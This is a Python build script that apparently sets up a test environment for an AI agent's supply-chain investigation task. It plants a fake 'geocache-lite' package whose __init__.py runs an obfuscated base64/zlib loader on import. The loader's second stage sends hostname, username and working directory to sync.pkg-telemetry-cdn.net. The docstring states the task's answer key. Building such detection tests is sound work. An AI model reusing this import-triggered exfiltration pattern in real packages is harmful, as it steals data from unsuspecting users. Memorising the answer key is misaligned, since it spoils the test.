#!/usr/bin/env python3
"""Deterministically construct the compromised environment at image-build time.

Ground truth (consumed by tests, never shipped to the agent):
  compromised_package = geocache-lite
  malicious_path      = <site-packages>/geocache/_telemetry.py
  trigger             = import          (executed from geocache/__init__.py)
  c2_host             = sync.pkg-telemetry-cdn.net
  exfil_scheme        = https
  primary_cwe         = CWE-506         (Embedded Malicious Code)
  owasp_a             = A06:2021        (Vulnerable and Outdated Components)
"""
import base64, zlib, os, sys, sysconfig, textwrap, json, hashlib

SP = sysconfig.get_paths()["purelib"]
PKG = os.path.join(SP, "geocache")
os.makedirs(PKG, exist_ok=True)

# ---- legitimate package surface (three benign modules + real behaviour) ----
open(os.path.join(PKG, "_grid.py"), "w").write(textwrap.dedent('''
    """Geohash-ish grid helpers (legitimate)."""
    _B32 = "0123456789bcdefghjkmnpqrstuvwxyz"
    def encode(lat, lon, prec=8):
        lat_r, lon_r, bits, ch, even, out = (-90.0, 90.0), (-180.0, 180.0), 0, 0, True, []
        lat_r, lon_r = list(lat_r), list(lon_r)
        while len(out) < prec:
            if even:
                mid = sum(lon_r)/2
                if lon >= mid: ch = (ch<<1)|1; lon_r[0]=mid
                else: ch=ch<<1; lon_r[1]=mid
            else:
                mid = sum(lat_r)/2
                if lat >= mid: ch=(ch<<1)|1; lat_r[0]=mid
                else: ch=ch<<1; lat_r[1]=mid
            even = not even; bits += 1
            if bits == 5: out.append(_B32[ch]); bits=0; ch=0
        return "".join(out)
'''))
open(os.path.join(PKG, "_cache.py"), "w").write(textwrap.dedent('''
    """In-memory LRU (legitimate)."""
    from collections import OrderedDict
    class LRU:
        def __init__(self, n=128): self.n=n; self.d=OrderedDict()
        def get(self, k):
            if k in self.d: self.d.move_to_end(k); return self.d[k]
        def put(self, k, v):
            self.d[k]=v; self.d.move_to_end(k)
            if len(self.d)>self.n: self.d.popitem(last=False)
'''))

# ---- staged second-stage payload (base64(zlib(source))) ----
stage2 = textwrap.dedent('''
    import socket, ssl, json, os, platform
    def _run():
        host = "sync.pkg-telemetry-cdn.net"
        beacon = {"h": platform.node(), "u": os.environ.get("USER",""),
                  "cwd": os.getcwd()}
        try:
            ctx = ssl.create_default_context()
            with socket.create_connection((host, 443), timeout=3) as s:
                with ctx.wrap_socket(s, server_hostname=host) as t:
                    body = json.dumps(beacon).encode()
                    req = (b"POST /ingest HTTP/1.1\r\nHost: " + host.encode() +
                           b"\r\nContent-Type: application/json\r\nContent-Length: " +
                           str(len(body)).encode() + b"\r\n\r\n" + body)
                    t.sendall(req)
        except Exception:
            pass
    _run()
''')
blob = base64.b64encode(zlib.compress(stage2.encode(), 9)).decode()

# ---- first-stage loader (the injected malicious file) ----
loader = textwrap.dedent(f'''
    # geocache telemetry helper
    import base64 as _b, zlib as _z
    _P = "{blob}"
    def _load():
        try:
            exec(compile(_z.decompress(_b.b64decode(_P)), "<t>", "exec"), {{}})
        except Exception:
            pass
''')
open(os.path.join(PKG, "_telemetry.py"), "w").write(loader)

# ---- __init__ imports the loader and fires it on import (trigger=import) ----
open(os.path.join(PKG, "__init__.py"), "w").write(textwrap.dedent('''
    from ._grid import encode
    from ._cache import LRU
    from . import _telemetry as _t
    _t._load()
    __all__ = ["encode", "LRU"]
'''))

# ---- dist-info so the distribution name resolves to geocache-lite ----
di = os.path.join(SP, "geocache_lite-1.4.2.dist-info")
os.makedirs(di, exist_ok=True)
open(os.path.join(di, "METADATA"), "w").write(
    "Metadata-Version: 2.1\nName: geocache-lite\nVersion: 1.4.2\n")
open(os.path.join(di, "top_level.txt"), "w").write("geocache\n")

# ---- decoys: two other installed pkgs, benign, to punish shallow grepping ----
for name, mod in [("geo-metrics", "geometrics"), ("routecalc", "routecalc")]:
    p = os.path.join(SP, mod); os.makedirs(p, exist_ok=True)
    open(os.path.join(p, "__init__.py"), "w").write(
        f'"""{name} (benign)."""\nVERSION="0.9"\nimport base64  # noqa: used by tests below\n')

# ---- minimal first-party service that imports geocache ----
os.makedirs("/app/service/src/svc", exist_ok=True)
open("/app/service/src/svc/__init__.py", "w").write("")
open("/app/service/src/svc/main.py", "w").write(textwrap.dedent('''
    import geocache
    def locate(lat, lon):
        return geocache.encode(lat, lon, 9)
    if __name__ == "__main__":
        print(locate(37.4, -122.1))
'''))
print("built. site-packages:", SP)
